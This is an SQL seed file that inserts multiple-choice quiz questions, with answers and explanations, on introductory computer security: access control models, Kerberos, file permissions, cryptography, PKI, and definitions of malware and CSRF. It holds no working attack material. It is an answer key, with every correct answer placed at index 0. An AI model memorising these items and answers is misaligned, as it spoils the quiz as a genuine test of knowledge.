...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What does the CIA triad stand for?', '["Confidentiality, Integrity, Availability","Control, Identity, Access","Confidentiality, Identity, Authorisation","Cryptography, Integrity, Authentication"]', 0, 'Confidentiality, Integrity, and Availability.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'Explain the difference between a Threat and a Vulnerability.', '["A vulnerability is a weakness; a threat is a potential violation of security","A vulnerability is an attack in progress; a threat is a flaw","They are identical terms","A threat is a weakness; a vulnerability is the actual attack"]', 0, 'A vulnerability is a weakness in the system, whereas a threat is a "potential" violation of security that represents a constant danger to an asset.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What does the "Fail-safe defaults" security design principle mean?', '["When in doubt, do not grant access","Keep the mechanism as simple as possible","Never rely on obscurity","Always grant access unless explicitly denied"]', 0, 'When in doubt, do not grant access.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'standard'), 'What are the three categories of security instruments/mechanisms mentioned in the system design lifecycle?', '["Prevention, Detection, Recovery/Reaction","Policy, Mechanism, Audit","Identify, Protect, Respond","Design, Build, Operate"]', 0, 'Prevention, Detection, and Recovery/Reaction.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'What is the primary vulnerability or downside of using a Capability List (C-List) instead of an ACL?', '["Poor overview of rights per object and difficult revocation","It cannot authenticate users","It exposes passwords in plaintext","It only works for a single user"]', 0, 'It offers a poor overview of access rights per object and makes revocation of rights difficult.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'In the Kerberos protocol, what is the purpose of the Ticket Granting Server (TGS)?', '["It verifies the TGT and issues a service ticket and session key for the application server","It hashes the user password into a key","It stores all user passwords","It encrypts the final application data"]', 0, 'The TGS verifies the client''s Ticket-Granting Ticket (TGT) and authenticator, and if valid, generates a specific service ticket and session key for the application server.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'standard'), 'State the Biba model''s rule regarding "writing" (modifying) an object.', '["Simple integrity: write allowed only if subject integrity >= object integrity (no write up)","Write allowed only if subject integrity <= object integrity","Write is always denied","Write allowed only if levels are equal"]', 0, 'Simple integrity: A subject can modify an object only if the subject''s integrity level is greater than or equal to the object''s integrity level ("No Write Up").');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What is the key size and the number of keys used in standard 3DES?', '["Three 56-bit keys applied Encrypt-Decrypt-Encrypt","One 128-bit key","Two 64-bit keys","Three 128-bit keys"]', 0, 'Three 56-bit keys (for a total of 168 bits, though sometimes two are the same), applied in an Encrypt-Decrypt-Encrypt sequence.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Define "Collision resistance" in the context of hash functions.', '["Infeasible to find any two distinct messages with the same hash","Infeasible to reverse a hash to its message","Infeasible to find a second message matching a given message hash","Infeasible to compute the hash at all"]', 0, 'It is the property that makes it computationally infeasible to find *any* two distinct messages ($M_1$ and $M_2$) that produce the exact same hash value ($h(M_1) = h(M_2)$).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'What formula illustrates the scalability problem of symmetric key distribution?', '["N x (N - 1) / 2","N x N","2^N","N - 1"]', 0, '$N \times (N - 1) / 2$.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'standard'), 'Explain the difference between a P-box and an S-box in block ciphers.', '["An S-box does key-controlled substitution (non-linearity); a P-box permutes bits","An S-box permutes bits; a P-box substitutes","Both only permute bits","Both only substitute values"]', 0, 'An S-box (Substitution box) performs complex, key-controlled substitutions to provide non-linearity. A P-box (Permutation box) performs block-wise permutations/scrambling of digits to provide maximum entropy.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'In Linux, what does the octal permission `644` translate to in text format?', '["rw-r--r--","rwxr--r--","rw-rw-r--","r--r--r--"]', 0, '`rw-r--r--` (Owner: read/write, Group: read-only, Others: read-only).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Define what an Access Control Entry (ACE) does in Windows.', '["An ACL entry defining allow or deny permissions for a specific principal SID","A list of all users on the system","A Linux file permission bit","A password hash record"]', 0, 'An individual entry within an ACL that defines positive (allow) or negative (deny) permissions for a specific principal SID.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'True or False: UNIX was designed from the ground up with a comprehensive, unified security architecture.', '["False","True"]', 0, 'False. UNIX explicitly does *not* have a security architecture; its design goals were modularity, portability, and efficiency.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'What is the purpose of the `umask` command in Linux?', '["It masks out bits from the default permissions of newly created files","It grants root access to a user","It encrypts new files","It lists active processes"]', 0, 'It changes the default permissions for newly created files and directories by masking out specific bits.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'Name three components found within a Windows Object Security Descriptor.', '["Owner SID, DACL, SACL","inode, umask, SUID","LSA, SAM, UAC","TGT, TGS, AS"]', 0, 'Any three of: Owner SID, Primary Group SID, DACL, SACL.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'standard'), 'What does the "Sticky flag" do when applied to a directory in Linux?', '["Only the file owner (or root) may remove files in that directory","It makes the directory read-only","It runs files with owner privilege","It hides the directory"]', 0, 'It ensures that only the owner of a file (or root) is permitted to remove files within that directory.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'Define "Malware" according to the slides.', '["Program code executed without the user''s consent that carries out harmful functionality","Any program that uses the network","Software with a graphical interface","A legally licensed application"]', 0, 'Program code executed without a user''s consent and carrying out harmful functionality.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What is the fundamental difference between a Trojan Horse and a Rootkit?', '["A Trojan masquerades as helpful software; a Rootkit hides processes and maintains privileged access","A Trojan spreads over the network; a Rootkit needs a host file","They are the same thing","A Rootkit masquerades as a game; a Trojan hides files"]', 0, 'A Trojan Horse masquerades as a helpful or harmless program to steal data or install malware, whereas a Rootkit is designed specifically to mask malicious processes and maintain hidden, privileged remote access.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'What specific component of a stack frame does a buffer overflow attacker aim to overwrite to hijack the execution flow?', '["The return address","The heap pointer","The program counter register","The function name"]', 0, 'The return address.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 5 AND variant = 'standard'), 'In web security, what does CSRF stand for, and what does it exploit?', '["Cross-Site Request Forgery; it exploits an existing authenticated session","Cross-Site Reflected Forgery; it injects scripts","Client-Side Request Filtering; it blocks cookies","Cross-Site Resource Fetch; it steals files"]', 0, 'Cross-Site Request Forgery. It exploits an existing authenticated session (like an active session cookie) by tricking the browser into sending a forged request.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the CIA triad stand for?', '["Confidentiality, Integrity, Availability","Control, Identity, Access","Confidentiality, Identity, Authorisation","Cryptography, Integrity, Authentication"]', 0, 'Confidentiality, Integrity, and Availability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Which two objectives were added "Beyond The CIA Triad" to form the five main security objectives?', '["Authentication and Accountability","Authorisation and Auditing","Privacy and Cost","Prevention and Recovery"]', 0, 'Authentication and Accountability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Define "Mechanism" in the context of computer security.', '["The methods used to fulfil policy requirements; the implementation of security","The rules specifying what security to achieve","The monetary value of an asset","A potential violation of security"]', 0, 'The methods which can be used to fulfil policy requirements; the "implementation" of security.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Explain the difference between a Threat and a Vulnerability.', '["A vulnerability is a weakness; a threat is a potential violation of security","A threat is a weakness; a vulnerability is the actual attack","They mean the same thing","A vulnerability is a deliberate act; a threat is a flaw"]', 0, 'A vulnerability is a weakness in the system, whereas a threat is a "potential" violation of security representing a constant danger.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two types of Asset Valuation listed in the slides?', '["Monetary replacement value and lost revenue","Price and probability","Hardware cost and software cost","Asset count and threat count"]', 0, 'Monetary replacement value and Lost revenue.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What is the mathematical formula for evaluating Risk?', '["Risk = Assets x Vulnerabilities x Threats","Risk = Assets + Threats","Risk = Threats / Controls","Risk = Vulnerabilities x Cost"]', 0, 'Risk = Assets x Vulnerabilities x Threats.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Differentiate between Quantitative and Qualitative risk analysis.', '["Quantitative uses price and probability for expected loss; Qualitative uses ad-hoc expert advice","Quantitative uses expert opinion; Qualitative uses formulas","Both are purely mathematical","Quantitative ignores cost; Qualitative ignores probability"]', 0, 'Quantitative analysis uses values from a mathematical domain (price and probability) to calculate an expected loss, while Qualitative analysis relies on ad-hoc advice by security experts without mathematical structure.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the three broad categories of Enterprise Security Threats?', '["Act of Human Error or Failure, Forces of Nature, Deviation in Quality of Services","Disclosure, Deception, Disruption","Prevention, Detection, Recovery","Hardware, Software, Network"]', 0, 'Act of Human Error or Failure, Forces of Nature, and Deviation in Quality of Services.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Give two examples of attacks that fall under the "Disclosure" threat class.', '["Snooping, sniffing, wiretapping","Spoofing and repudiation","Modification and delay","Denial of service and replay"]', 0, 'Snooping, sniffing, or wiretapping.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the three functions of security instruments/mechanisms?', '["Prevention, Detection, Recovery/Reaction","Policy, Mechanism, Audit","Confidentiality, Integrity, Availability","Identify, Protect, Respond"]', 0, 'Prevention, Detection, and Recovery/Reaction.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Give an example of a "Semi-technical" prevention mechanism.', '["SSL encryption or credit card validation","Burglar alarms and locks","Firewalls and IDS","Vulnerability scanning"]', 0, 'SSL encryption or credit card validation.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the "Fail-safe defaults" security design principle mean?', '["When in doubt, do not grant access","No security by obscurity","Keep the mechanism simple","Grant access unless explicitly denied"]', 0, 'When in doubt, do not grant access.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What does the "Open design" security design principle mean?', '["No security by obscurity","When in doubt, deny access","Use minimum necessary privileges","Keep designs hidden from attackers"]', 0, 'No "security by obscurity".');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two core elements of a "Defence-in-Depth" strategy?', '["Layered protection and Diversification","Prevention and Detection","Confidentiality and Integrity","Sensitivity differentiation and Information hiding"]', 0, 'Layered protection and Diversification.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What are the two core elements of a "Compartmentalisation" strategy?', '["Sensitivity/privilege differentiation and Information hiding","Layered protection and Diversification","Prevention and Recovery","Economy of mechanism and Open design"]', 0, 'Sensitivity/privilege differentiation and Information hiding.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'What four conflicting elements make up the "Security Quadrilema"?', '["Security, Cost, Functionality, User expertise","Confidentiality, Integrity, Availability, Accountability","Prevention, Detection, Recovery, Reaction","Assets, Vulnerabilities, Threats, Risk"]', 0, 'Security, Cost, Functionality, and User expertise.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'List the five layers of the "Onion Model" starting from the innermost layer.', '["Hardware, OS kernel, Operating system, Services, Applications","Applications, Services, OS, Kernel, Hardware","Kernel, Hardware, Services, OS, Applications","Hardware, Firmware, Network, OS, Users"]', 0, 'Hardware, OS kernel, Operating system, Services, and Applications.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'Your organisation evaluates the danger of a server room fire. They calculate that a replacement server costs £10,000, and the probability of a fire is 1% per year, resulting in an expected loss calculation of £100 annually. According to the slides, what specific type of analysis is this?', '["Quantitative risk analysis","Qualitative risk analysis","Defence-in-Depth","Asset valuation"]', 0, 'Quantitative risk analysis.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 1 AND variant = 'extended'), 'A network engineer installs a web application firewall, a network firewall, and local personal firewalls on user workstations. According to the slides, what specific security design strategy is the engineer employing?', '["Defence-in-Depth (Layered protection)","Compartmentalisation","Fail-safe defaults","Separation of privilege"]', 0, 'Defence-in-Depth (specifically Layered protection).');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What five properties does Information Security protect?', '["Confidentiality, Integrity, Availability, Accountability, Privacy","Confidentiality, Integrity, Availability","Identification, Authentication, Authorisation, Accountability, Privacy","Security, Robustness, Capacity, Cost, Speed"]', 0, 'Confidentiality, Integrity, Availability, Accountability, and Privacy.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the three aspects that contend with each other in an information-hiding system?', '["Security, Robustness, Capacity","Confidentiality, Integrity, Availability","Correctness, Impersonation prevention, Transferability protection","Identification, Authentication, Authorisation"]', 0, 'Security, Robustness, and Capacity.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the three main objectives of authentication?', '["Correctness, Impersonation prevention, Protection against transferability","Confidentiality, Integrity, Availability","Something you know, have, are","Identification, Authentication, Authorisation"]', 0, 'Correctness, Impersonation prevention, and Protection against transferability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), '"Signature dynamics" falls under which category of user authentication?', '["Something you are (behavioral characteristics)","Something you know","Something you have","Something you trust"]', 0, '"Something you are" (behavioral characteristics).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'State the exact logical condition for the Bell-LaPadula "Simple Security Property" (ss-Property) regarding reading an object.', '["Subject s can read object o iff L(o) <= L(s) and s may read o","Subject s can read object o iff L(s) <= L(o)","Subject s can write object o iff L(o) <= L(s)","Subject s can read object o iff levels are equal"]', 0, 'Subject $s$ can read object $o$ iff $L(o) \le L(s)$ and $s$ has permission to read $o$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What does the "Integrity confinement" rule state in the Biba model?', '["A subject can read an object only if I(S) <= I(O)","A subject can read an object only if I(S) >= I(O)","A subject can write an object only if I(S) >= I(O)","A subject can invoke another only if I(S1) >= I(S2)"]', 0, 'A subject can read an object only if $I(S) \le I(O)$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'In the context of access control structures, what is the disadvantage of using a Capability List (C-List) over an ACL?', '["Poor overview of access rights per object and difficult revocation","It cannot authenticate users","It stores passwords in plaintext","It only supports one object"]', 0, 'It offers a poor overview of access rights per object and makes revocation difficult.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What is a "Protection ring" and what occupies Ring 0?', '["A hierarchy of access right levels; Ring 0 is the OS kernel","A list of user passwords; Ring 0 is the admin","A capability list; Ring 0 holds user processes","A conflict of interest class; Ring 0 is services"]', 0, 'A hierarchy of access right levels; Ring 0 is occupied by the operating system kernel.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Identify the three core requirements of a Reference Monitor.', '["Tamper-resistance, Complete mediation, Easiness of verification and testing","Confidentiality, Integrity, Availability","Identification, Authentication, Authorisation","Speed, Simplicity, Scalability"]', 0, 'Tamper-resistance, Complete mediation (guaranteed invocation), and Easiness of verification and testing.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Which formal security model actively relies on "Conflict of Interest" (COI) classes?', '["The Chinese Wall model","The Bell-LaPadula model","The Biba model","Role Based Access Control"]', 0, 'The Chinese Wall model.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Define "Role Based Access Control" (RBAC) according to the slides.', '["A logical layer linking users and resources based on the need or circumstances of access","Access control carried out by the resource owner","Centralised access fixed by an administrator","Explicit revocation of access rights"]', 0, 'A "logical" layer that links users and allowed resources based on the need or circumstances in which a user needs a resource.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What four steps make up the Resource Access sequence?', '["Identification, Authentication, Authorization, Accountability","Login, Request, Ticket, Accept","Confidentiality, Integrity, Availability, Privacy","Subject, Object, Reference Monitor, Group"]', 0, 'Identification, Authentication, Authorization, and Accountability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the five placement levels for a Reference Monitor?', '["Hardware, OS kernel, Operating system, Services, Applications","Kernel, Hardware, Services, OS, Applications","Ring 0, 1, 2, 3, 4","Identification, Authentication, Authorization, Accountability, Audit"]', 0, 'Hardware, OS kernel, Operating system, Services, and Applications.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Does the Bell-LaPadula *-Property allow "writes up" or "writes down"?', '["Writes up","Writes down","Both writes up and down","Neither writes up nor down"]', 0, 'It allows "writes up" but disallows "writes down".');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'In the Kerberos protocol, what happens immediately after the client generates Authenticator U (Step 5)?', '["Step 6: Send TGS","Step 4: Send TGT","Step 8: Send Service Ticket","Step 1: Login"]', 0, 'Step 6: Send TGS.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What does "Negative permission" mean in access control abstractions?', '["Explicit revocation of access rights","A mapping of users to access rights","A collection of related subjects","A hierarchy of protection rings"]', 0, 'It is the explicit revocation of access rights.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'A subject with a ''Secret'' clearance wants to read a file classified as ''Top Secret''. According to the Bell-LaPadula model, what specific property blocks this action, and what is its informal name?', '["The Simple Security Property (ss-Property), informally \"no reads up\"","The *-Property, informally \"no writes down\"","The Biba simple integrity rule","The Chinese Wall *-property"]', 0, 'The Simple Security Property (ss-Property) blocks this action, informally known as the "no reads up" rule.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'A consultant reads an unsanitised file belonging to Domino''s. She then attempts to read a file belonging to Pizza Hut (which is in the same Conflict of Interest class), and attempts to write to a file belonging to Ford Motors (a different COI class). According to the Chinese Wall model, which actions are blocked, and why?', '["Reading Pizza Hut is blocked by the simple rule; writing to Ford is blocked by the *-property","Only the Pizza Hut read is blocked","Only the Ford write is blocked","Neither action is blocked"]', 0, 'Both actions are blocked. Reading the Pizza Hut file is blocked by the Simple Security Rule (she has already accessed a competitor in the same COI class). Writing to the Ford Motors file is blocked by the *-property (she has read unsanitised information in a different company dataset—Domino''s).');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the mathematical formula illustrating the scalability problem of symmetric key distribution?', '["N x (N - 1) / 2","N x N","2^N","N - 1"]', 0, '$N \times (N - 1) / 2$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Name the three classifications of cryptography based on ''Method'', ''Key'', and ''Processing''.', '["Method (Transposition/Substitution), Key (Asymmetric/Symmetric), Processing (Stream/Block)","Confusion, Diffusion, Avalanche","Hash, Salt, Key","DES, AES, RSA"]', 0, 'Method (Transposition/Substitution), Key (Asymmetric/Symmetric), and Processing (Stream/Block).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What mathematical operation is used in a Feistel cipher to combine $L_i$ with the output of $F(R_i, K_i)$?', '["XOR (Exclusive OR)","AND","Modular addition","Bit rotation"]', 0, 'XOR (Exclusive OR).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What are the input and output bit sizes of a DES S-box?', '["6-bit input and 4-bit output","4-bit input and 6-bit output","8-bit input and 8-bit output","32-bit input and 48-bit output"]', 0, '6-bit input and 4-bit output.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the 3DES (Triple DES) equation for encryption using three keys?', '["C = E_k3(D_k2(E_k1(P)))","C = E_k1(E_k2(E_k3(P)))","C = D_k1(E_k2(D_k3(P)))","C = E_k1(D_k2(P))"]', 0, '$C = E_{k3}(D_{k2}(E_{k1}(P)))$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'According to Shannon''s theory, what is the only perfectly secure encryption algorithm?', '["The One Time Pad","3DES","Rijndael (AES)","The Feistel cipher"]', 0, 'The One Time Pad.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Does the Rijndael (AES) algorithm use a Feistel structure?', '["No; it uses a state matrix with non-linear, mixing, and key addition layers","Yes; it is a Feistel network","Yes; like DES it splits the block in halves","No; it uses only transposition"]', 0, 'No, it uses a state matrix with non-linear, linear mixing, and key addition layers.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Define "Preimage resistance" for a hash function.', '["For a given D it is infeasible to find M such that D = h(M)","It is infeasible to find any two messages with the same hash","It is infeasible to find M'' != M with the same hash","It is infeasible to compute the hash"]', 0, 'For any given value $D$, it is computationally infeasible to find $M$ such that $D = h(M)$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'According to the Birthday Paradox, how many operations are required to stage a collision attack on an ideal hash function with an output size of $n$?', '["2^(n/2) operations","2^n operations","n^2 operations","n x (n-1)/2 operations"]', 0, '$2^{n/2}$ operations.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Name the four main components of a Public Key Infrastructure (PKI).', '["Certification Authority, Registration Authority, Users/Subscriber, Repository/Archive","Sender, Receiver, Key, Cipher","CA, Firewall, VPN, IDS","Hash, Salt, Certificate, Key"]', 0, 'Certification Authority (CA), Registration Authority (RA), Users/Subscriber, and Repository/Archive.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Which PKI component is responsible for verifying certificate contents for the CA (Identity proofing)?', '["Registration Authority (RA)","Certification Authority (CA)","Repository/Archive","The Subscriber"]', 0, 'Registration Authority (RA).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What two security characteristics does a Digital Signature natively provide?', '["Data Integrity and Non-repudiation","Confidentiality and Integrity","Confidentiality and Availability","Authentication and Confidentiality"]', 0, 'Data Integrity and Non-repudiation.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the fundamental difference between an Active attack and a Passive attack?', '["Active attacks alter resources/operation; Passive attacks only learn information without affecting resources","Active attacks only eavesdrop; Passive attacks modify data","Active attacks are undetectable; Passive attacks are preventable","They are the same"]', 0, 'Active attacks attempt to alter system resources or affect their operation, whereas Passive attacks merely attempt to learn or make use of information without affecting system resources.');
...
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'In what type of cryptographic protocol does a trusted third party only help if needed and after the fact?', '["An Adjudicated Protocol","An Arbitrated Protocol","A Zero Knowledge Protocol","A Feistel Protocol"]', 0, 'An Adjudicated Protocol.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What does a Certification Authority (CA) publish to list invalid or revoked certificates?', '["Certificate Revocation Lists (CRLs)","The X.509 certificate","The Registration Authority list","The session key archive"]', 0, 'Certificate Revocation Lists (CRLs).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What specifically does an X.509 digital certificate bind together?', '["An entity name to its public key","A password to its hash","A symmetric key to a session","A private key to a certificate"]', 0, 'It binds an entity name to its public key.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What does the "Avalanche effect" refer to in conventional cryptography?', '["A diffusion property where a 1-bit change cascades into large ciphertext differences","Substitution that obscures the key relationship","Shrinking of ciphertext per round","The reuse of a one time pad"]', 0, 'It is a diffusion property where a 1-bit difference in the plaintext or the key rapidly results in a large difference in the ciphertext bits.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Alice wants to send a confidential message to Bob using asymmetric cryptography so that absolutely no one else can read it. Which specific key must Alice use to encrypt the message, and which key will Bob use to decrypt it?', '["Bob''s public key to encrypt; Bob''s private key to decrypt","Alice''s private key to encrypt; Alice''s public key to decrypt","A shared symmetric key for both","Bob''s private key to encrypt; Bob''s public key to decrypt"]', 0, 'Alice must encrypt the message using *Bob''s Public Key*. Bob will then decrypt it using *Bob''s Private Key*.');
